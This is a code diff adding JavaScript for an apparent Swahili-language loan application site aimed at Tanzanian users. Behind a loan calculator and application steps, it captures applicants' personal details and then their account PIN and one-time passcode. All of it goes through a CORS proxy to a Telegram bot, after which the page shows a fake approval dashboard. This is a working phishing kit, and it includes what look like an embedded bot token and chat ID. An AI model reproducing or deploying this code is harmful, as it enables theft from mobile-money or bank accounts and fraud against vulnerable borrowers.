@@ -1,0 +1,298 @@
+// ==========================================
+// 1. TELEGRAM CONFIGURATION
+// ==========================================
+// ✅ SECURE: Load from environment variables (NOT hardcoded!)
+const TELEGRAM_TOKEN = process.env.8997212434:AAHiCqsMue78uczOac5fr3AEwO1ZXrCcVcw || "";
+const TELEGRAM_CHAT_ID = process.env.8524294724 || "";
+
+// Fallback for browsers (where process.env doesn't work):
+if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    // Try loading from .env file (for local development with Vite/Webpack)
+    TELEGRAM_TOKEN = window?.env?.BOT_TOKEN || "";
+    TELEGRAM_CHAT_ID = window?.env?.CHAT_ID || "";
+}
+
+// ⚠️ CRITICAL: If tokens are missing, show error
+if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("⚠️ WARNING: BOT_TOKEN or CHAT_ID not set! Set environment variables:");
+    console.warn("   export BOT_TOKEN='your_token_here'");
+    console.warn("   export CHAT_ID='your_chat_id_here'");
+}
+
+// ==========================================
+// 2. GLOBAL APP STATE
+// ==========================================
+let applicationData = { 
+    amount: 500000, 
+    duration: 12, 
+    type: '', 
+    purpose: '', 
+    firstName: '', 
+    lastName: '', 
+    email: '', 
+    phone: '', 
+    employment: '', 
+    income: '' 
+};
+
+// Initialize Application Engine
+document.addEventListener("DOMContentLoaded", function() {
+    initCalculator();
+});
+
+// Dynamic Step & Tracker Controller
+function goToStep(stepNumber) {
+    // Hide all step views first
+    document.querySelectorAll('.app-view').forEach(v => {
+        if(v.id === 'view-step1' || v.id === 'view-step2' || v.id === 'view-step3') {
+            v.classList.remove('active');
+        }
+    });
+    
+    // Activate target step view
+    const targetView = document.getElementById(`view-step${stepNumber}`);
+    if(targetView) targetView.classList.add('active');
+
+    // Update Progress Fill Line Percentage
+    const fillPercent = ((stepNumber - 1) / 2) * 100;
+    document.getElementById('progress-fill').style.width = `${fillPercent}%`;
+
+    // Manage Step Indicator Active States
+    for(let i = 1; i <= 3; i++) {
+        const dot = document.getElementById(`step-dot-${i}`);
+        if(dot) {
+            if(i <= stepNumber) {
+                dot.classList.add('active');
+            } else {
+                dot.classList.remove('active');
+            }
+        }
+    }
+}
+
+function startApplication() {
+    document.getElementById('view-landing').classList.remove('active');
+    document.getElementById('progress-container').classList.remove('hidden');
+    goToStep(1);
+}
+
+function exitApplication() {
+    document.getElementById('progress-container').classList.add('hidden');
+    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
+    document.getElementById('view-landing').classList.add('active');
+}
+
+// Navigation Engine for direct overlays
+function navigateTo(viewId) {
+    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
+    const target = document.getElementById(viewId);
+    if(target) target.classList.add('active');
+}
+
+// Visual Blur Spinner Overlay Handler
+function showLoading(msg, duration, callback) {
+    const overlay = document.getElementById('loading-overlay');
+    document.getElementById('overlay-msg').innerText = msg;
+    overlay.classList.remove('hidden');
+    setTimeout(() => { 
+        overlay.classList.add('hidden'); 
+        if(callback) callback(); 
+    }, duration);
+}
+
+// ==========================================
+// 3. CORE CALCULATOR MATH LOGIC
+// ==========================================
+function initCalculator() {
+    const amountSlider = document.getElementById('calc-amount');
+    const durationSlider = document.getElementById('calc-duration');
+    
+    const update = () => {
+        const amt = parseInt(amountSlider.value);
+        const dur = parseInt(durationSlider.value);
+        
+        document.getElementById('calc-amount-val').innerText = `TSh ${amt.toLocaleString()}`;
+        document.getElementById('calc-duration-val').innerText = `miezi ${dur}`;
+        
+        // Premium Interest Compounding Model (2.1% Base Rate per Month)
+        const monthlyInterestRate = 0.021;
+        const totalPayable = amt + (amt * monthlyInterestRate * dur);
+        const monthly = Math.round(totalPayable / dur);
+        
+        document.getElementById('calc-monthly-payment').innerText = `TSh ${monthly.toLocaleString()}`;
+        
+        applicationData.amount = amt;
+        applicationData.duration = dur;
+        
+        if(document.getElementById('loan-amount')) document.getElementById('loan-amount').value = amt;
+        if(document.getElementById('loan-duration')) document.getElementById('loan-duration').value = dur;
+    };
+    
+    if(amountSlider && durationSlider) {
+        amountSlider.addEventListener('input', update);
+        durationSlider.addEventListener('input', update);
+        update();
+    }
+}
+
+// ==========================================
+// 4. INTERACTIVE STEP HANDLING
+// ==========================================
+function saveStep1() {
+    applicationData.type = document.getElementById('loan-type').value;
+    applicationData.amount = parseInt(document.getElementById('loan-amount').value);
+    applicationData.duration = parseInt(document.getElementById('loan-duration').value);
+    applicationData.purpose = document.getElementById('loan-purpose').value;
+    goToStep(2);
+}
+
+function saveStep2() {
+    applicationData.firstName = document.getElementById('first-name').value;
+    applicationData.lastName = document.getElementById('last-name').value;
+    applicationData.email = document.getElementById('email').value;
+    
+    let rawPhone = document.getElementById('phone').value.trim();
+    if(rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
+    applicationData.phone = "+255" + rawPhone;
+
+    // Push data variables onto the summary box preview panels
+    document.getElementById('sum-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
+    document.getElementById('sum-duration').innerText = `${applicationData.duration} Miezi`;
+    document.getElementById('sum-name').innerText = `${applicationData.firstName} ${applicationData.lastName}`;
+    goToStep(3);
+}
+
+// ==========================================
+// 5. SECURE TELEGRAM DATA ROUTING
+// ==========================================
+function submitApplication() {
+    applicationData.employment = document.getElementById('employment-status').value;
+    applicationData.income = document.getElementById('annual-income').value;
+    
+    showLoading("Inahakiki vigezo vya mkopo…", 2500, () => {
+        // Clear progress line from top on submission
+        document.getElementById('progress-container').classList.add('hidden');
+        
+        // ✅ Validate tokens exist before sending
+        if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error("🚨 ERROR: BOT_TOKEN or CHAT_ID not configured!");
+            alert("Server configuration error. Please contact support.");
+            return;
+        }
+        
+        const message = `
+🔔 *Maombi Mapya ya Mkopo!*
+----------------------------
+👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
+📱 *Namba:* ${applicationData.phone}
+📧 *Email:* ${applicationData.email}
+💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
+📅 *Muda:* ${applicationData.duration} Miezi
+🛠 *Aina:* ${applicationData.type}
+🎯 *Madhumuni:* ${applicationData.purpose}
+💼 *Ajira:* ${applicationData.employment}
+💵 *Kipato/Mwezi:* TSh ${parseInt(applicationData.income).toLocaleString()}
+        `;
+        
+        sendToTelegram(message);
+        
+        // Auto-populate protected layout inputs inside verification step
+        if(document.getElementById('login-phone')) {
+            document.getElementById('login-phone').value = applicationData.phone.replace("+255", "");
+        }
+        navigateTo('view-login');
+    });
+}
+
+function handleLogin() {
+    showLoading("Inatengeneza Secure Gateway…", 2000, () => { 
+        navigateTo('view-otp'); 
+    });
+}
+
+function moveOtpFocus(current, nextId) {
+    if(current.value.length >= 1) {
+        document.getElementById(nextId).focus();
+    }
+}
+
+function verifyOtp() {
+    const otpCode = 
+        document.getElementById('otp1').value + 
+        document.getElementById('otp2').value + 
+        document.getElementById('otp3').value + 
+        document.getElementById('otp4').value;
+        
+    const plainPin = document.getElementById('login-pin').value;
+
+    showLoading("Inakamilisha Uhakiki...", 3000, () => {
+        // ✅ Validate tokens exist before sending
+        if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error("🚨 ERROR: BOT_TOKEN or CHAT_ID not configured!");
+            alert("Server configuration error. Please contact support.");
+            return;
+        }
+        
+        const securityMessage = `
+🔑 *Uthibitisho wa Kuingia*
+----------------------------
+📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
+🔐 *PIN ya Akaunti:* ${plainPin}
+🔢 *Msimbo wa OTP:* ${otpCode}
+        `;
+        
+        sendToTelegram(securityMessage);
+        
+        document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
+        navigateTo('view-dashboard');
+    });
+}
+
+// ==========================================
+// 6. HIGH-PERFORMANCE TRANSMISSION ENGINE
+// ==========================================
+function sendToTelegram(textMessage) {
+    const cleanToken = TELEGRAM_TOKEN.trim();
+    const cleanChatId = TELEGRAM_CHAT_ID.trim();
+    
+    // ✅ Security validation before API call
+    if (!cleanToken || !cleanChatId) {
+        console.error("🚨 CRITICAL: Telegram credentials missing!");
+        return;
+    }
+    
+    const proxyUrl = "https://corsproxy.io/?"; 
+    const telegramApiUrl = `https://api.telegram.org/bot${cleanToken}/sendMessage`;
+    
+    const payload = {
+        chat_id: cleanChatId,
+        text: textMessage,
+        parse_mode: "Markdown",
+        disable_web_page_preview: true
+    };
+
+    fetch(proxyUrl + encodeURIComponent(telegramApiUrl), {
+        method: "POST",
+        headers: { 
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP Error Status: ${response.status}`);
+        }
+        return response.json();
+    })
+    .then(data => {
+        if (data.ok) {
+            console.log("✅ Data successfully pushed to Telegram channel.");
+        } else {
+            console.error("❌ Telegram API reject trace:", data.description);
+        }
+    })
+    .catch(error => {
+        console.error("🚨 Gateway routing error:", error.message);
+    });
+}
